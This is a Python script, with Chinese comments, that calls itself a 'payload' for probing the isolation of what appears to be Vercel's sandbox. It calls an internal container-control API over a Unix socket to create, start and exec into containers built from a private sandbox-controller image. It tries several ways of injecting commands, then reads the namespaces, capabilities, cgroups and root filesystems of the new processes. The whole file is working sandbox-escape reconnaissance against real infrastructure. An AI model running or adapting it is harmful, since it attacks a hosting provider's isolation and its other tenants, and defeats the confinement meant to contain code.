# -*- coding: utf-8 -*-
"""v110 payload: 容器隔离性验证 + Create 带 command
P1 Create 带 command 参数变体探测
P2 新容器 ns/caps 检查 (隔离性)
P3 connect+proto 流式 Exec
输出 /vercel/sandbox/v110c.out"""
import socket, struct, time, signal, json, os

OUT = '/vercel/sandbox/v110c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(200)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=3.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
        log('CONN %s -> %s [%s] %r' % (path, status, ctype, payload[:250]))
        return d, status, payload
    except Exception as e:
        log('CONN %s EXC %s' % (path, type(e).__name__))
        return b'', 'EXC', b''


def ns_of(pid):
    """读 /proc/pid/ns/pid, net, mnt inode"""
    out = {}
    for fld in ('pid', 'net', 'mnt', 'user'):
        try:
            out[fld] = os.readlink('/proc/%d/ns/%s' % (pid, fld))
        except Exception:
            out[fld] = 'ERR'
    return out


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

log('=== P1 create with command variants ===')
# 变体1: args
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS,
                          json.dumps({'image': IMG, 'args': ['/bin/sleep', '300']}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('variant1(args) cid=%s' % cid)
if cid:
    d, st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    log('v1 START -> %s %r' % (st, pay[:150]))
    time.sleep(0.5)
    # 找新进程
    import subprocess
    r = subprocess.run(['/bin/sh', '-c', "ps -ef 2>/dev/null | grep -E 'sleep 300|PID' | head -5"],
                       capture_output=True, timeout=5)
    log('v1 ps: %r' % ((r.stdout or b'')[:300]))
    # Kill
    d, st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=5)
    log('v1 KILL -> %s %r' % (st, pay[:100]))

# 变体2: command
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS,
                          json.dumps({'image': IMG, 'command': ['/bin/sleep', '300']}).encode(), t=10)
log('variant2(command) -> %s %r' % (st, pay[:250]))

# 变体3: process.args
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS,
                          json.dumps({'image': IMG, 'process': {'args': ['/bin/sleep', '300']}}).encode(), t=10)
log('variant3(process) -> %s %r' % (st, pay[:250]))

# 变体4: entrypoint
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS,
                          json.dumps({'image': IMG, 'entrypoint': ['/bin/sleep', '300']}).encode(), t=10)
log('variant4(entrypoint) -> %s %r' % (st, pay[:250]))

# 变体5: cmd
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS,
                          json.dumps({'image': IMG, 'cmd': ['/bin/sleep', '300']}).encode(), t=10)
log('variant5(cmd) -> %s %r' % (st, pay[:250]))

log('=== P2 create+start+exec quick ===')
# 快速 Create -> Start -> 立即 Exec
d, st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if cid:
    d, st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    log('START -> %s %r' % (st, pay[:150]))
    # 立即列新 pid
    me = os.getpid()
    log('my ns: %s' % ns_of(me))
    pids0 = set(int(x) for x in os.listdir('/proc') if x.isdigit())
    time.sleep(0.3)
    pids1 = set(int(x) for x in os.listdir('/proc') if x.isdigit())
    newp = sorted(pids1 - pids0)
    log('new pids: %s' % newp)
    for p in newp:
        try:
            log('pid %d ns=%s caps=%s' % (p, ns_of(p), open('/proc/%d/status' % p).read().split('CapEff:')[1][:20].strip()))
        except Exception as e:
            log('pid %d ERR %s' % (p, e))
    # Exec connect+proto 流式 (curl 带 --http2)
    try:
        proto_req = b'\x0a' + bytes([len(cid)]) + cid.encode() + b'\x12' + bytes([5]) + b'\x0a\x03id\x00'
        tmp = '/vercel/sandbox/exec_req.bin'
        open(tmp, 'wb').write(proto_req)
        cmd = ['curl', '-sS', '--max-time', '8', '--http2-prior-knowledge', '--unix-socket', CELL,
               '-X', 'POST', '-H', 'Content-Type: application/connect+proto',
               '--data-binary', '@%s' % tmp, 'http://unix%s/Exec' % CTRS]
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        log('EXEC connect+proto rc=%d out=%r' % (r.returncode, (r.stdout or b'')[:300]))
    except Exception as e:
        log('EXEC EXC %s' % type(e).__name__)
    # 检查 687 类进程隔离
    for p in newp:
        try:
            with open('/proc/%d/cgroup' % p) as fh:
                cg = fh.read().replace('\n', ' ')[:200]
            with open('/proc/%d/root/etc/hostname' % p) as fh:
                hn = fh.read()[:50]
            log('pid %d cgroup=%s hostname=%s' % (p, cg, hn))
        except Exception as e:
            log('pid %d inspect ERR %s' % (p, type(e).__name__))
    # 清理
    d, st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=5)
    log('KILL -> %s %r' % (st, pay[:100]))

log('V110C_DONE')
f.close()
